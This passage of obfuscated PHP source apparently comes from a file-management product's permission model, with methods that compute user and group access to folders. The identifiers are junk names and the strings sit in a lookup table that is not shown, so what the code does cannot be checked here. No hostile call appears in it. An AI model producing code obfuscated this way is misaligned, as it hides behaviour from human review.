intval($ãÖ„å½[$„¨–²ŠÇ[1937]]) ? intval($ãÖ„å½[$„¨–²ŠÇ[1937]]) : 0, $„¨–²ŠÇ[1991] => intval($ãÖ„å½[$„¨–²ŠÇ[1991]]) ? intval($ãÖ„å½[$„¨–²ŠÇ[1991]]) : -1); } $this->where(array($„¨–²ŠÇ[423] => $ï ı–©Ò))->delete(); $this->addAll($Ô­ÆŠñ); return !0; } public function authClear($Š½úø‘Ë) { $µ»â‚÷² =& $_SERVER[¯µç›È¢]; $ÏŞ•ªÒµ = Model($µ»â‚÷²[1337])->sourceInfo($Š½úø‘Ë); $¥æõŒÊ¾ = array($Š½úø‘Ë); if ($ÏŞ•ªÒµ[$µ»â‚÷²[416]] == $µ»â‚÷²[99]) { $¶Ï†ˆè = array($µ»â‚÷²[592] => array($µ»â‚÷²[552], $ÏŞ•ªÒµ[$µ»â‚÷²[526]] . $Š½úø‘Ë . $µ»â‚÷²[553])); $¥æõŒÊ¾ = Model($µ»â‚÷²[1337])->field($µ»â‚÷²[423])->where($¶Ï†ˆè)->getField($µ»â‚÷²[408], !0); $¥æõŒÊ¾[] = $Š½úø‘Ë; } $this->where(array($µ»â‚÷²[423] => array($µ»â‚÷²[424], $¥æõŒÊ¾)))->delete(); return !0; } public function getAllChildren($œšİÚí§) { $ª§ÆóÚ¾ =& $_SERVER[¯µç›È¢]; $œ‹¥ù×í = Model($ª§ÆóÚ¾[1337])->sourceInfo($œšİÚí§); if ($œ‹¥ù×í[$ª§ÆóÚ¾[416]] != $ª§ÆóÚ¾[99]) { return $this->sourceListAuth(array($œšİÚí§)); } if ($œ‹¥ù×í[$ª§ÆóÚ¾[417]] != SourceModel::TYPE_GROUP) { return array(); } $¤üıÌ‹‡ = 1; $¬×´íû = array($œšİÚí§); if ($œ‹¥ù×í[$ª§ÆóÚ¾[503]] == $ª§ÆóÚ¾[204] && $œ‹¥ù×í[$ª§ÆóÚ¾[510]] != $¤üıÌ‹‡) { $¬×´íû = $this->groupChidldAllRootSource($œ‹¥ù×í[$ª§ÆóÚ¾[510]]); } $…Æáşòı = $this->field($ª§ÆóÚ¾[408])->group($ª§ÆóÚ¾[408])->select(); $…Æáşòı = array_to_keyvalue($…Æáşòı, $ª§ÆóÚ¾[12], $ª§ÆóÚ¾[408]); if (!$…Æáşòı) { return array(); } $èÄ¸ó’ = $ª§ÆóÚ¾[2010]; $ªêÙ†¥œ = array($ª§ÆóÚ¾[408] => array($ª§ÆóÚ¾[7], $…Æáşòı), $ª§ÆóÚ¾[436] => $ª§ÆóÚ¾[204]); $„œ™´ = Model($ª§ÆóÚ¾[842])->field($èÄ¸ó’)->where($ªêÙ†¥œ)->select(); $±´µµ = array($œšİÚí§); foreach ($„œ™´ as $ƒ¯î´™) { foreach ($¬×´íû as $çôœâš) { $ÉÔ©Ğï = $ª§ÆóÚ¾[50] . $çôœâš . $ª§ÆóÚ¾[50]; $Û“¬¯„À = $ƒ¯î´™[$ª§ÆóÚ¾[526]] . $ƒ¯î´™[$ª§ÆóÚ¾[408]] . $ª§ÆóÚ¾[50]; if (strstr($Û“¬¯„À, $ÉÔ©Ğï)) { $±´µµ[] = $ƒ¯î´™[$ª§ÆóÚ¾[408]]; break; } } } return $this->sourceListAuth($±´µµ); } private function sourceListAuth($—×¥Š) { $òÁ’è =& $_SERVER[¯µç›È¢]; $«Üç„à = Model($òÁ’è[1337])->sourceListInfo($—×¥Š, !0); $–ÌöÓ®Ï = $this->sourceAuthSelect($—×¥Š); $†›°ÕÊ = array(); $²‚™ºáĞ = array(); foreach ($«Üç„à as $¶›ƒÊ¥) { unset($¶›ƒÊ¥[$òÁ’è[459]]); unset($¶›ƒÊ¥[$òÁ’è[457]]); unset($¶›ƒÊ¥[$òÁ’è[419]]); unset($¶›ƒÊ¥[$òÁ’è[97]]); $ùˆøõ = $–ÌöÓ®Ï[$¶›ƒÊ¥[$òÁ’è[408]]]; if (!$ùˆøõ) { continue; } $¶›ƒÊ¥[$òÁ’è[2011]] = $this->authTargetInfo($ùˆøõ); $¶›ƒÊ¥[$òÁ’è[524]] = rtrim($¶›ƒÊ¥[$òÁ’è[530]], $òÁ’è[8]) . $òÁ’è[8] . ltrim($¶›ƒÊ¥[$òÁ’è[524]], $òÁ’è[8]); $†›°ÕÊ[] = $¶›ƒÊ¥; $ÜüìŒ‘È = count(explode($òÁ’è[8], trim($¶›ƒÊ¥[$òÁ’è[524]], $òÁ’è[8]))); $²‚™ºáĞ[] = $ÜüìŒ‘È + ($¶›ƒÊ¥[$òÁ’è[33]] == $òÁ’è[89] ? 0 : 1000); } array_multisort($²‚™ºáĞ, SORT_ASC, $†›°ÕÊ); return $†›°ÕÊ; } private function groupChidldAllRootSource($¹Çªƒâ ) { $÷‹ÊµèŞ =& $_SERVER[¯µç›È¢]; $™Àøëöè = Model($÷‹ÊµèŞ[2012])->groupChildrenAll($¹Çªƒâ ); $†ì†îâÄ = array($÷‹ÊµèŞ[503] => 0, $÷‹ÊµèŞ[510] => array($÷‹ÊµèŞ[7], $™Àøëöè), $÷‹ÊµèŞ[417] => SourceModel::TYPE_GROUP); $ËŞãˆË  = Model($÷‹ÊµèŞ[842])->field($÷‹ÊµèŞ[408])->where($†ì†îâÄ)->select(); $ËŞãˆË  = array_to_keyvalue($ËŞãˆË , $÷‹ÊµèŞ[12], $÷‹ÊµèŞ[408]); return $ËŞãˆË ; } private function authTargetInfo($Œê³çâ) { $êÈ˜™¾Ä =& $_SERVER[¯µç›È¢]; $ù÷‰³ó‚ = array(); $¿íÒŸß = array(); $²ñóñƒ· = 2 << 25; foreach ($Œê³çâ as $şå«ô¹ˆ) { $ïÒÀ„– = Model($êÈ˜™¾Ä[512])->listData($şå«ô¹ˆ[$êÈ˜™¾Ä[1937]]); if (!$ïÒÀ„–) { continue; } if ($şå«ô¹ˆ[$êÈ˜™¾Ä[417]] == SourceModel::TYPE_USER) { $¶„¢ùÃÏ = Model($êÈ˜™¾Ä[518])->getInfoSimpleOuter($şå«ô¹ˆ[$êÈ˜™¾Ä[510]]); if ($¶„¢ùÃÏ[$êÈ˜™¾Ä[1666]] == $êÈ˜™¾Ä[1200]) { continue; } if ($¶„¢ùÃÏ[$êÈ˜™¾Ä[1666]] == $êÈ˜™¾Ä[204]) { $¶„¢ùÃÏ[$êÈ˜™¾Ä[32]] = LNG($êÈ˜™¾Ä[2013]); } } else { $¶„¢ùÃÏ = Model($êÈ˜™¾Ä[527])->getInfoSimple($şå«ô¹ˆ[$êÈ˜™¾Ä[510]]); } if (!$¶„¢ùÃÏ) { continue; } $¶„¢ùÃÏ[$êÈ˜™¾Ä[471]] = $ïÒÀ„–; $ù÷‰³ó‚[] = $¶„¢ùÃÏ; $¹û«»Æ = 0; if ($şå«ô¹ˆ[$êÈ˜™¾Ä[417]] == SourceModel::TYPE_GROUP) { $¹û«»Æ = $²ñóñƒ· * 2; } if ($şå«ô¹ˆ[$êÈ˜™¾Ä[417]] == SourceModel::TYPE_USER) { $¹û«»Æ = $²ñóñƒ·; } if ($şå«ô¹ˆ[$êÈ˜™¾Ä[417]] == SourceModel::TYPE_USER && $şå«ô¹ˆ[$êÈ˜™¾Ä[510]] == $êÈ˜™¾Ä[204]) { $¹û«»Æ = 0; } $¿íÒŸß[] = $ïÒÀ„–[$êÈ˜™¾Ä[419]] + $¹û«»Æ; } array_multisort($¿íÒŸß, SORT_DESC, $ù÷‰³ó‚); return $ù÷‰³ó‚; } public function getAllChildrenByUser($Ìã›Õ—, $ß¿ì³˜ä) { $üæ€©¬³ =& $_SERVER[¯µç›È¢]; $çã‰–ä± = Model($üæ€©¬³[546])->getInfo($ß¿ì³˜ä); if (!$ß¿ì³˜ä || !$Ìã›Õ— || !$çã‰–ä±) { return array(); } $’œ±‡±œ = Model($üæ€©¬³[1337])->sourceInfo($Ìã›Õ—); $î®ÜŒ± = array(); $ŠÔÇéÁî = 1; if ($’œ±‡±œ[$üæ€©¬³[503]] == $üæ€©¬³[204] && $’œ±‡±œ[$üæ€©¬³[510]] != $ŠÔÇéÁî && $this->groupContainUser($’œ±‡±œ[$üæ€©¬³[510]], $ß¿ì³˜ä)) { foreach ($çã‰–ä±[$üæ€©¬³[2014]] as $ÅóÃ¾ÄÈ) { $¾¶²•ûÏ = Model($üæ€©¬³[527])->getInfo($ÅóÃ¾ÄÈ[$üæ€©¬³[1834]]); $ø‹Ìë° = Model($üæ€©¬³[546])->getInfoSimpleOuter($ß¿ì³˜ä); $ø‹Ìë°[$üæ€©¬³[471]] = $ÅóÃ¾ÄÈ[$üæ€©¬³[419]]; if (Model($üæ€©¬³[512])->authCheckAction($ÅóÃ¾ÄÈ[$üæ€©¬³[419]][$üæ€©¬³[419]], $üæ€©¬³[1854])) { continue; } $ğóñëÙŸ = array($üæ€©¬³[32] => $üæ€©¬³[1615] . $¾¶²•ûÏ[$üæ€©¬³[32]], $üæ€©¬³[408] => $¾¶²•ûÏ[$üæ€©¬³[97]][$üæ€©¬³[408]], $üæ€©¬³[88] => KodIO::make($¾¶²•ûÏ[$üæ€©¬³[97]][$üæ€©¬³[408]]), $üæ€©¬³[503] => $üæ€©¬³[204], $üæ€©¬³[417] => $üæ€©¬³[520], $üæ€©¬³[33] => $üæ€©¬³[556], $üæ€©¬³[524] => $¾¶²•ûÏ[$üæ€©¬³[531]], $üæ€©¬³[1834] => $¾¶²•ûÏ[$üæ€©¬³[1834]], $üæ€©¬³[528] => $¾¶²•ûÏ[$üæ€©¬³[503]], $üæ€©¬³[2011] => array($ø‹Ìë°)); $î®ÜŒ±[$ğóñëÙŸ[$üæ€©¬³[408]]] = $ğóñëÙŸ; } } $ÄÃ¨Şá³ = array(); $ÀãÍ°Ç‚ = $this->getAllChildren($Ìã›Õ—); foreach ($ÀãÍ°Ç‚ as $ËÄÕ¡ı ) { $Å‘£Ä°ö = !1; foreach ($ËÄÕ¡ı [$üæ€©¬³[2011]] as $‹ÂÌ´æ) { if ($‹ÂÌ´æ[$üæ€©¬³[1666]]) { if ($‹ÂÌ´æ[$üæ€©¬³[1666]] == $ß¿ì³˜ä) { $Å‘£Ä°ö = !0; break; } } if ($‹ÂÌ´æ[$üæ€©¬³[1834]]) { if ($this->groupContainUser($‹ÂÌ´æ[$üæ€©¬³[1834]], $ß¿ì³˜ä)) { $Å‘£Ä°ö = !0; break; } } } if ($Å‘£Ä°ö) { $ÄÃ¨Şá³[] = $ËÄÕ¡ı ; } $èº“Úî = $ËÄÕ¡ı [$üæ€©¬³[408]]; if (isset($î®ÜŒ±[$èº“Úî])) { $ËÄÕ¡ı [$üæ€©¬³[2011]][] = $î®ÜŒ±[$èº“Úî][0]; $î®ÜŒ±[$èº“Úî] = !1; } } $î®ÜŒ± = array_filter(array_values($î®ÜŒ±)); $ÄÃ¨Şá³ = array_merge($î®ÜŒ±, $ÄÃ¨Şá³); return $ÄÃ¨Şá³; } public function setAllChildrenByUser($÷‚Œôˆê, $Í‚·”ï­, $âöàûÎÈ) { $±÷±Ş‡È =& $_SERVER[¯µç›È¢]; $ƒ¼ôß×§ = $this->getAllChildrenByUser($÷‚Œôˆê, $Í‚·”ï­); if (!$âöàûÎÈ || !$ƒ¼ôß×§) { return !1; } foreach ($ƒ¼ôß×§ as $Š®€ùÓ) { $¦ÕûØ¨– = array(); foreach ($Š®€ùÓ[$±÷±Ş‡È[2011]] as $ì­øÛéó) { $®¸¬ÜÅœ = $ì­øÛéó[$±÷±Ş‡È[471]]; $¡´­¸› = $ì­øÛéó[$±÷±Ş‡È[1666]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $·ıóŒ€Æ = $ì­øÛéó[$±÷±Ş‡È[1666]] ? $ì­øÛéó[$±÷±Ş‡È[1666]] : $ì­øÛéó[$±÷±Ş‡È[1834]]; if ($ì­øÛéó[$±÷±Ş‡È[1666]] && $ì­øÛéó[$±÷±Ş‡È[1666]] == $Í‚·”ï­) { continue; } $¦ÕûØ¨–[] = array($±÷±Ş‡È[408] => $Š®€ùÓ[$±÷±Ş‡È[408]], $±÷±Ş‡È[417] => $¡´­¸›, $±÷±Ş‡È[510] => intval($·ıóŒ€Æ), $±÷±Ş‡È[1937] => isset($®¸¬ÜÅœ[$±÷±Ş‡È[405]]) ? intval($®¸¬ÜÅœ[$±÷±Ş‡È[405]]) : 0, $±÷±Ş‡È[1991] => isset($®¸¬ÜÅœ[$±÷±Ş‡È[1991]]) ? intval($®¸¬ÜÅœ[$±÷±Ş‡È[1991]]) : -1); } $¦ÕûØ¨–[] = array($±÷±Ş‡È[408] => $Š®€ùÓ[$±÷±Ş‡È[408]], $±÷±Ş‡È[417] => SourceModel::TYPE_USER, $±÷±Ş‡È[510] => intval($Í‚·”ï­), $±÷±Ş‡È[1937] => intval($âöàûÎÈ), $±÷±Ş‡È[1991] => -1); $this->where(array($±÷±Ş‡È[423] => $Š®€ùÓ[$±÷±Ş‡È[408]]))->delete(); $this->addAll($¦ÕûØ¨–); } return !0; } public function get($¯ŠİŠó) { $¥ö»–»â = $this->getSourceList(array($¯ŠİŠó), !0); return $¥ö»–»â[0]; } public function getSourceList($İ’©ïÌ«, $Á…Ë¾Æ = false, $ÔåĞ£ = false) { $İ©½® =& $_SERVER[¯µç›È¢]; if (!$İ’©ïÌ«) { return array(); } $»ª”é›í = Model($İ©½®[1337]); if (!$Á…Ë¾Æ && count($İ’©ïÌ«) == 1) { $Á…Ë¾Æ = array(); $Á…Ë¾Æ[$İ’©ïÌ«[0]] = $»ª”é›í->sourceInfo($İ’©ïÌ«[0]); } if (!$Á…Ë¾Æ) { $ªÏİ¢‡  = array($İ©½®[423] => array($İ©½®[424], $İ’©ïÌ«)); $Á…Ë¾Æ = $»ª”é›í->field($İ©½®[2015])->where($ªÏİ¢‡ )->select(); $Á…Ë¾Æ = array_to_keyvalue($Á…Ë¾Æ, $İ©½®[408]); } $Ğ›¥—â– = $İ’©ïÌ«; foreach ($Á…Ë¾Æ as $™ŠÛ³™ä => $´ï‰´Ö) { $„õœÅğ÷ = $»ª”é›í->parentLevelArray($´ï‰´Ö[$İ©½®[526]]); $Ğ›¥—â– = array_merge($Ğ›¥—â–, array($™ŠÛ³™ä), array_reverse($„õœÅğ÷)); } $Ğ›¥—â– = array_values(array_unique($Ğ›¥—â–)); if (!$Ğ›¥—â–) { return array(); } $¹ÓéŸö— = $this->sourceAuthSelect($Ğ›¥—â–); $Çêã´Ê° = array(); foreach ($Ğ›¥—â– as $á±†¨‰) { if (isset($¹ÓéŸö—[$á±†¨‰])) { $Çêã´Ê°[$á±†¨‰] = $¹ÓéŸö—[$á±†¨‰]; } } $ËÅÄ‚Ì— = $this->userIsRoot($ÔåĞ£); $õ‰­àÌ = AuthModel::authAll(); $Œ€ ¶Ê = array($İ©½®[420] => $õ‰­àÌ, $İ©½®[2016] => array($İ©½®[425] => 0, $İ©½®[1840] => $õ‰­àÌ, $İ©½®[426] => LNG($İ©½®[2017]), $İ©½®[1856] => $İ©½®[2018])); $óŠ•°Ó = array(); foreach ($Á…Ë¾Æ as $á±†¨‰ => $ßêáöãå) { if ($ËÅÄ‚Ì—) { $óŠ•°Ó[$á±†¨‰] = $Œ€ ¶Ê; continue; } $óŠ•°Ó[$á±†¨‰] = $this->makeSourceAuth($ßêáöãå, $Çêã´Ê°, $ÔåĞ£); } return $óŠ•°Ó; } public function authDeepCheck($±øÚ÷Îı, $‰ÃŸ¿ú£ = false) { $­¾®™È =& $_SERVER[¯µç›È¢]; $‰ÃŸ¿ú£ = $‰ÃŸ¿ú£ ? $‰ÃŸ¿ú£ : USER_ID; $ÈÓÆÚó¶ = $this->makeAuthDeep($‰ÃŸ¿ú£); if (!in_array($±øÚ÷Îı, $ÈÓÆÚó¶[$­¾®™È[2019]])) { return !1; } $Û—È¿ó = array(); foreach ($ÈÓÆÚó¶[$­¾®™È[2020]] as $ÜóŸœÈ => $‘©Ø„¼) { if (!in_array($±øÚ÷Îı, $‘©Ø„¼)) { continue; } $Û—È¿ó[] = $ÜóŸœÈ; } if (!$Û—È¿ó) { return !1; } $¡áßùËî = $Û—È¿ó ? $Û—È¿ó[0] : $±øÚ÷Îı; return array($­¾®™È[420] => -1, $­¾®™È[471] => array($­¾®™È[425] => $­¾®™È[1200], $­¾®™È[1840] => $­¾®™È[204], $­¾®™È[426] => LNG($­¾®™È[2021]), $­¾®™È[1856] => $­¾®™È[2022]), $­¾®™È[2023] => LNG($­¾®™È[2024]), $­¾®™È[2025] => $this->sourceAuthInfo($¡áßùËî)); } protected function makeAuthDeep($âØ›ªéŞ = false) { $¤ÑÃ·æ =& $_SERVER[¯µç›È¢]; static $¸©‰ûª = array(); $âØ›ªéŞ = $âØ›ªéŞ ? $âØ›ªéŞ : USER_ID; if (isset($¸©‰ûª[$âØ›ªéŞ])) { return $¸©‰ûª[$âØ›ªéŞ]; } $òèç´ƒ˜ = Model($¤ÑÃ·æ[2026])->listData(); $© Çµ›Í = array(); foreach ($òèç´ƒ˜ as $åØÁÓ™) { if ($åØÁÓ™[$¤ÑÃ·æ[419]] == 0 && $åØÁÓ™[$¤ÑÃ·æ[1855]] == $¤ÑÃ·æ[99]) { $© Çµ›Í[] = $åØÁÓ™[$¤ÑÃ·æ[405]]; } } $€Œë„Ñú = $this->userGroupParents($âØ›ªéŞ); $Š“¬ŠäÎ = array($¤ÑÃ·æ[417] => SourceModel::TYPE_USER, $¤ÑÃ·æ[510] => $âØ›ªéŞ); if ($€Œë„Ñú) { $Š“¬ŠäÎ = array(array($¤ÑÃ·æ[417] => SourceModel::TYPE_USER, $¤ÑÃ·æ[510] => $âØ›ªéŞ), array($¤ÑÃ·æ[417] => SourceModel::TYPE_GROUP, $¤ÑÃ·æ[510] => array($¤ÑÃ·æ[424], $€Œë„Ñú)), $¤ÑÃ·æ[1012] => $¤ÑÃ·æ[1931]); } $Î½Ù˜æ = $this->field($¤ÑÃ·æ[2027])->where($Š“¬ŠäÎ)->select(); $õ»š»Ú² = array(); $Ğ‚­Ú‹‰ = array_to_keyvalue_group($Î½Ù˜æ, $¤ÑÃ·æ[408]); foreach ($Ğ‚­Ú‹‰ as $êè¿„‡ë => $÷Õ¢´ê) { $ñÑ–Ÿ· = $this->authArrayCheck($÷Õ¢´ê, $âØ›ªéŞ); if ($ñÑ–Ÿ·[$¤ÑÃ·æ[420]] > 0) { $õ»š»Ú²[] = $êè¿„‡ë . $¤ÑÃ·æ[12]; } } if ($€Œë„Ñú) { $ŞØéıÃ÷ = Model($¤ÑÃ·æ[527]); foreach ($€Œë„Ñú as $Ìş²î´¸) { $ª“ïéÉ¬ = $ŞØéıÃ÷->getInfo($Ìş²î´¸); if (!$ª“ïéÉ¬ || !is_array($ª“ïéÉ¬[$¤ÑÃ·æ[97]])) { continue; } $õ»š»Ú²[] = $ª“ïéÉ¬[$¤ÑÃ·æ[97]][$¤ÑÃ·æ[408]]; } } $Ôê¯¸Ç¥ = array(); $Ä€Û„°² = $€Œë„Ñú; $²é‹ÏÓ² = Model($¤ÑÃ·æ[1337]); $ŞØéıÃ÷ = Model($¤ÑÃ·æ[527]); $üÌ¿ÊÍ× = array(); $â¶°ÇŞŠ = array(); $ÂşòãÍö = array(); $¾ÎÌ³÷— = array(); if ($õ»š»Ú²) { $§à¤ƒ­· = $²é‹ÏÓ²->where(array($¤ÑÃ·æ[408] => array($¤ÑÃ·æ[424], $õ»š»Ú²)))->select(); foreach ($§à¤ƒ­· as $òô²áÈÈ) { $©À ó¡¥ = $²é‹ÏÓ²->parentLevelArray($òô²áÈÈ[$¤ÑÃ·æ[526]]); $Ôê¯¸Ç¥ = array_merge($Ôê¯¸Ç¥, $©À ó¡¥); $Ä€Û„°²[] = $òô²áÈÈ[$¤ÑÃ·æ[510]]; $üÌ¿ÊÍ×[$òô²áÈÈ[$¤ÑÃ·æ[408]]] = $©À ó¡¥; $â¶°ÇŞŠ[$òô²áÈÈ[$¤ÑÃ·æ[408]]] = $òô²áÈÈ[$¤ÑÃ·æ[510]]; } } $Ä€Û„°² = array_values(array_unique($Ä€Û„°²)); $—üà¨’ğ = $Ä€Û„°²; foreach ($—üà¨’ğ as $Ìş²î´¸) { $ª“ïéÉ¬ = $ŞØéıÃ÷->getInfo($Ìş²î´¸); $©À ó¡¥ = $²é‹ÏÓ²->parentLevelArray($ª“ïéÉ¬[$¤ÑÃ·æ[526]]); $Ä€Û„°² = array_merge($Ä€Û„°², $©À ó¡¥); } $Ä€Û„°² = array_values(array_unique($Ä€Û„°²)); foreach ($Ä€Û„°² as $Ìş²î´¸) { $ª“ïéÉ¬ = $ŞØéıÃ÷->getInfo($Ìş²î´¸); $Ôê¯¸Ç¥[] = $ª“ïéÉ¬[$¤ÑÃ·æ[97]][$¤ÑÃ·æ[408]]; $ÂşòãÍö[$Ìş²î´¸] = $ª“ïéÉ¬[$¤ÑÃ·æ[97]][$¤ÑÃ·æ[408]]; $¾ÎÌ³÷—[$Ìş²î´¸] = $²é‹ÏÓ²->parentLevelArray($ª“ïéÉ¬[$¤ÑÃ·æ[526]]); } foreach ($üÌ¿ÊÍ× as $†Î¥´é“ => $Û©‘ÉŞ¬) { $ìÖ¼Î¯¢ = $â¶°ÇŞŠ[$†Î¥´é“]; if (!$ìÖ¼Î¯¢ || !$ÂşòãÍö[$ìÖ¼Î¯¢]) { continue; } $Îé«¢ƒì = array(); foreach ($¾ÎÌ³÷—[$ìÖ¼Î¯¢] as $Ìş²î´¸) { $Îé«¢ƒì[] = $ÂşòãÍö[$Ìş²î´¸]; } $üÌ¿ÊÍ×[$†Î¥´é“] = array_merge($Îé«¢ƒì, $Û©‘ÉŞ¬); } $Ôê¯¸Ç¥ = array_values(array_unique($Ôê¯¸Ç¥)); $¢ÊĞ¨ ´ = array($¤ÑÃ·æ[2019] => $Ôê¯¸Ç¥, $¤ÑÃ·æ[2020] => $üÌ¿ÊÍ×); $¸©‰ûª[$âØ›ªéŞ] = $¢ÊĞ¨ ´; return $¢ÊĞ¨ ´; } private function makeSourceAuth($¿–€€ØÌ, $ŞÆ½ËîË, $ã¡œ‚¤Ù = false) { $½É’ç– =& $_SERVER[¯µç›È¢]; $£ä³¥é÷ = $½É’ç–[99]; $áÂ´íè¨ = $¿–€€ØÌ[$½É’ç–[510]]; $…Ï€¶¹Ê = $¿–€€ØÌ[$½É’ç–[417]] == SourceModel::TYPE_GROUP; $ş‰‡ëŸá = $…Ï€¶¹Ê ? $this->groupRootAuth($áÂ´íè¨, $ã¡œ‚¤Ù) : !1; if ($ş‰‡ëŸá && Model($½É’ç–[512])->authCheckAction($ş‰‡ëŸá[$½É’ç–[419]], $½É’ç–[1854])) { return $this->groupAuthInfo($ş‰‡ëŸá, $áÂ´íè¨); } $í Ø“ø = Model($½É’ç–[1337])->parentLevelArray($¿–€€ØÌ[$½É’ç–[526]]); $í Ø“ø = array_merge(array($¿–€€ØÌ[$½É’ç–[408]]), array_reverse($í Ø“ø)); $Â¾ÈËº = !1; foreach ($í Ø“ø as $‹²œ•Ø´) { if (!isset($ŞÆ½ËîË[$‹²œ•Ø´])) { continue; } $®™…’ª = $this->authMake($ŞÆ½ËîË[$‹²œ•Ø´], $ã¡œ‚¤Ù); if ($®™…’ª[$½É’ç–[471]]) { $Â¾ÈËº = $®™…’ª; break; } } if (!$…Ï€¶¹Ê) { return $Â¾ÈËº; } if (!$Â¾ÈËº && $ş‰‡ëŸá) { $Â¾ÈËº = $this->groupAuthInfo($ş‰‡ëŸá, $áÂ´íè¨); } if (!$Â¾ÈËº) { $àš …Ëµ = Model($½É’ç–[527])->getInfo($áÂ´íè¨); $ó†»¶ÒŒ = explode($½É’ç–[50], trim($àš …Ëµ[$½É’ç–[526]], $½É’ç–[50])); $ó†»¶ÒŒ = array_reverse($ó†»¶ÒŒ); foreach ($ó†»¶ÒŒ as $£¢ø†íå) { if ($£¢ø†íå == $½É’ç–[204] || $£¢ø†íå == $£ä³¥é÷) { continue; } $Ğ¦†×¢« = $this->groupRootAuth($£¢ø†íå, $ã¡œ‚¤Ù); if (!$Ğ¦†×¢«) { continue; } $Â¾ÈËº = $this->groupAuthInfo($Ğ¦†×¢«, $£¢ø†íå); break; } } if (!$Â¾ÈËº || $Â¾ÈËº[$½É’ç–[420]] <= 0) { $êÁéÍà« = $this->authDeepCheck($¿–€€ØÌ[$½É’ç–[408]], $ã¡œ‚¤Ù); if ($êÁéÍà«) { $Â¾ÈËº = $êÁéÍà«; } } return $Â¾ÈËº; } private function userIsRoot($Í’©§ÍÂ = false) { $³Ûù²â† =& $_SERVER[¯µç›È¢]; if (!$Í’©§ÍÂ && _get($GLOBALS, $³Ûù²â†[508])) { return !0; } $¨Õú­Ô• = Model($³Ûù²â†[546])->getInfo($Í’©§ÍÂ); $İ¡œ­á— = Model($³Ûù²â†[2028])->listData($¨Õú­Ô•[$³Ûù²â†[1546]]); if ($İ¡œ­á— && $İ¡œ­á—[$³Ûù²â†[516]][$³Ûù²â†[2029]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ûÀºÜ ) { $ÁÕ¡Üû =& $_SERVER[¯µç›È¢]; $Åå«ôû = Model($ÁÕ¡Üû[1337]); $ŞÜÀ¦ßè = $Åå«ôû->sourceInfo($ûÀºÜ ); if (!$ŞÜÀ¦ßè) { return !1; } $Åå«ôû->groupPathDisplay($ŞÜÀ¦ßè); $ê’Ùç¶Ö = array($ŞÜÀ¦ßè); $ê’Ùç¶Ö = $Åå«ôû->_listAppendPath($ê’Ùç¶Ö); $ŞÜÀ¦ßè = $ê’Ùç¶Ö[0]; $ŠçÂã²Á = $ŞÜÀ¦ßè[$ÁÕ¡Üû[524]]; if (isset($ŞÜÀ¦ßè[$ÁÕ¡Üû[532]])) { $Í±ĞûÎş = explode($ÁÕ¡Üû[8], trim($ŞÜÀ¦ßè[$ÁÕ¡Üû[524]], $ÁÕ¡Üû[8])); array_shift($Í±ĞûÎş); $ŠçÂã²Á = $ŞÜÀ¦ßè[$ÁÕ¡Üû[530]] . $ÁÕ¡Üû[2030] . implode($ÁÕ¡Üû[8], $Í±ĞûÎş); } return array($ÁÕ¡Üû[426] => $ŞÜÀ¦ßè[$ÁÕ¡Üû[32]], $ÁÕ¡Üû[88] => KodIO::make($ŞÜÀ¦ßè[$ÁÕ¡Üû[408]]), $ÁÕ¡Üû[2031] => $ŠçÂã²Á); } private function groupAuthInfo($Ò¥“éÙ, $óªë³îº) { $¤‰‘ÃËØ =& $_SERVER[¯µç›È¢]; $ãÁîà©Ñ = Model($¤‰‘ÃËØ[527])->getInfo($óªë³îº); return array($¤‰‘ÃËØ[2032] => intval($Ò¥“éÙ[$¤‰‘ÃËØ[419]]), $¤‰‘ÃËØ[2016] => $Ò¥“éÙ, $¤‰‘ÃËØ[2033] => LNG($¤‰‘ÃËØ[2034]), $¤‰‘ÃËØ[2025] => array($¤‰‘ÃËØ[426] => $ãÁîà©Ñ[$¤‰‘ÃËØ[32]], $¤‰‘ÃËØ[88] => KodIO::make($ãÁîà©Ñ[$¤‰‘ÃËØ[97]][$¤‰‘ÃËØ[408]]), $¤‰‘ÃËØ[2031] => $ãÁîà©Ñ[$¤‰‘ÃËØ[531]])); } protected function groupRootAuth($“ÁÙ¡ø², $Ÿş¨éÎª = false) { $êÔÛ´Ú =& $_SERVER[¯µç›È¢]; $Ÿş¨éÎª = $Ÿş¨éÎª ? $Ÿş¨éÎª : USER_ID; $İıÇ¥úö = $Ÿş¨éÎª . $êÔÛ´Ú[2035] . $“ÁÙ¡ø²; static $ù§ûŒáŒ = array(); if (isset($ù§ûŒáŒ[$İıÇ¥úö])) { return $ù§ûŒáŒ[$İıÇ¥úö]; } $ä¾°ãÀè = Model($êÔÛ´Ú[527])->getInfo($“ÁÙ¡ø²); $¢ë¦çğ£ = $this->userGroupList($Ÿş¨éÎª); $õ‘®•ˆ = isset($¢ë¦çğ£[$“ÁÙ¡ø²]) ? $¢ë¦çğ£[$“ÁÙ¡ø²][$êÔÛ´Ú[419]] : !1; if ($õ‘®•ˆ && Model($êÔÛ´Ú[512])->authCheckAction($õ‘®•ˆ[$êÔÛ´Ú[419]], $êÔÛ´Ú[1854])) { $ù§ûŒáŒ[$İıÇ¥úö] = $õ‘®•ˆ; return $õ‘®•ˆ; } $µÎÛšé“ = $this->sourceAuthSelect($ä¾°ãÀè[$êÔÛ´Ú[97]][$êÔÛ´Ú[408]]); $à»ë‰³ = $µÎÛšé“ ? $this->authMake($µÎÛšé“, $Ÿş¨éÎª) : !1; $ÆÓí€óå = $à»ë‰³ ? $à»ë‰³[$êÔÛ´Ú[471]] : !1; $ù§ûŒáŒ[$İıÇ¥úö] = $ÆÓí€óå ? $ÆÓí€óå : $õ‘®•ˆ; return $ù§ûŒáŒ[$İıÇ¥úö]; } public function authOwnerApply($­Õ”Ûµ“) { $€®¡Éäˆ =& $_SERVER[¯µç›È¢]; if (empty($­Õ”Ûµ“[$€®¡Éäˆ[419]]) || isset($­Õ”Ûµ“[$€®¡Éäˆ[2036]]) && $­Õ”Ûµ“[$€®¡Éäˆ[2036]]) { return $­Õ”Ûµ“; } if (AuthModel::authCheckRoot($­Õ”Ûµ“[$€®¡Éäˆ[419]][$€®¡Éäˆ[420]])) { return $­Õ”Ûµ“; } $Ü›Ÿ÷§¬ = Model($€®¡Éäˆ[1337])->parentLevelArray($­Õ”Ûµ“[$€®¡Éäˆ[526]]); $Ü›Ÿ÷§¬ = array_merge(array($­Õ”Ûµ“[$€®¡Éäˆ[408]]), array_reverse($Ü›Ÿ÷§¬)); $ŠºâúĞµ = $this->sourceAuthSelect($Ü›Ÿ÷§¬); $¿‚«–Í = array(); $®İƒ‘ö· = array(); foreach ($ŠºâúĞµ as $«•¬÷‹¸ => $‰¤´ÚÓ†) { 